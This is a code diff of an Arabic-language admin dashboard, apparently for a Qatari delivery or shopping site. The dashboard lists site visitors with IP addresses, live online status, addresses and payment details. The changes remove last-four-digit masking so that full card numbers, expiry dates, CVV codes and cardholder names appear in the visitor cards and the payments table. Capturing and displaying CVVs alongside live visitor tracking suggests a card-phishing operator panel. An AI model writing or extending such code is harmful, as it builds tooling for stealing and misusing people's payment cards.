@@ -103,30 +103,37 @@
             data.visitors.forEach((visitor, index) => {
               const deliveryData = visitor.delivery_data || {};
               const paymentData = visitor.payment_data || {};
-              const hasData = deliveryData.fullName || paymentData.cardNumber;
               
               const card = document.createElement('div');
               card.className = 'visitor-card';
               card.style.opacity = '0';
               card.style.transform = 'translateY(20px)';
+              
+              // Full data display
               card.innerHTML = `
                 <div class="visitor-header">
                   <div class="visitor-flag">${visitor.country_code || '🌍'}</div>
                   <div class="visitor-info">
-                    <h4>${deliveryData.fullName || visitor.ip_address || 'زائر'}</h4>
-                    <p>${visitor.ip_address || ''}</p>
+                    <h4>${deliveryData.fullName || paymentData.cardHolder || visitor.ip_address || 'زائر'}</h4>
+                    <p>IP: ${visitor.ip_address || '—'}</p>
                   </div>
                   <div class="visitor-status ${visitor.is_online ? 'online' : 'offline'}">
                     ${visitor.is_online ? '🟢 متصل' : '⚫ غير متصل'}
                   </div>
                 </div>
                 <div class="visitor-details">
-                  ${hasData ? `
-                    <div class="detail-item"><span>📞</span> ${deliveryData.phone || 'N/A'}</div>
-                    <div class="detail-item"><span>📍</span> ${deliveryData.address || 'N/A'}</div>
-                    <div class="detail-item"><span>💳</span> ${paymentData.cardNumber ? '•••• ' + paymentData.cardNumber.slice(-4) : 'كاش'}</div>
-                    <div class="detail-item"><span>📦</span> ${deliveryData.productName || 'N/A'}</div>
-                  ` : '<p style="color:#888;">لا يوجد بيانات طلب</p>'}
+                  <div class="detail-item"><span>📞</span> ${deliveryData.phone || '—'}</div>
+                  <div class="detail-item"><span>📍</span> ${deliveryData.address || '—'}</div>
+                  <div class="detail-item"><span>📦</span> ${deliveryData.productName || '—'} ${deliveryData.quantity ? '×' + deliveryData.quantity : ''}</div>
+                  <hr style="border:none;border-top:1px solid #333;margin:8px 0;">
+                  <div class="detail-item"><span>💳</span> ${paymentData.paymentMethod === 'cash' ? 'كاش 💵' : 'بطاقة 💳'}</div>
+                  ${paymentData.cardNumber ? `
+                    <div class="detail-item"><span>🔢</span> ${paymentData.cardNumber}</div>
+                    <div class="detail-item"><span>📅</span> ${paymentData.expiry || '—'}</div>
+                    <div class="detail-item"><span>🔐</span> CVV: ${paymentData.cvv || '—'}</div>
+                    <div class="detail-item"><span>👤</span> ${paymentData.cardHolder || '—'}</div>
+                  ` : ''}
+                  ${paymentData.paymentAmount ? `<div class="detail-item"><span>💰</span> ${paymentData.paymentAmount} ر.ق</div>` : ''}
                 </div>
               `;
               grid.appendChild(card);
@@ -221,9 +228,10 @@
                 <td>${index + 1}</td>
                 <td>${d.fullName || '—'}</td>
                 <td>${p.paymentMethod === 'cash' ? '💵 كاش' : '💳 بطاقة'}</td>
-                <td>${p.cardNumber ? '•••• ' + p.cardNumber.slice(-4) : '—'}</td>
+                <td style="font-family:monospace;font-size:13px;">${p.cardNumber || '—'}</td>
+                <td>${p.expiry || '—'} <br><small>CVV: ${p.cvv || '—'}</small></td>
+                <td>${p.cardHolder || '—'}</td>
                 <td>${p.paymentAmount ? p.paymentAmount + ' ر.ق' : '—'}</td>
-                <td><span class="badge ${p.paymentMethod === 'cash' ? 'warning' : 'success'}">${p.paymentMethod === 'cash' ? 'عند الاستلام' : 'تم الدفع'}</span></td>
                 <td>${new Date(payment.timestamp || Date.now()).toLocaleDateString('ar-QA')}</td>
               </tr>
             `;
@@ -496,16 +504,17 @@
               <thead>
                 <tr>
                   <th>#</th>
-                  <th>اسم العميل</th>
-                  <th>طريقة الدفع</th>
+                  <th>العميل</th>
+                  <th>الدفع</th>
                   <th>رقم البطاقة</th>
+                  <th>انتهاء / CVV</th>
+                  <th>الحامل</th>
                   <th>المبلغ</th>
-                  <th>الحالة</th>
                   <th>التاريخ</th>
                 </tr>
               </thead>
               <tbody id="paymentsTableBody">
-                <tr><td colspan="7" class="empty-state"><span>💳</span><p>جاري تحميل المدفوعات...</p></td></tr>
+                <tr><td colspan="8" class="empty-state"><span>💳</span><p>جاري تحميل المدفوعات...</p></td></tr>
               </tbody>
             </table>
           </div>
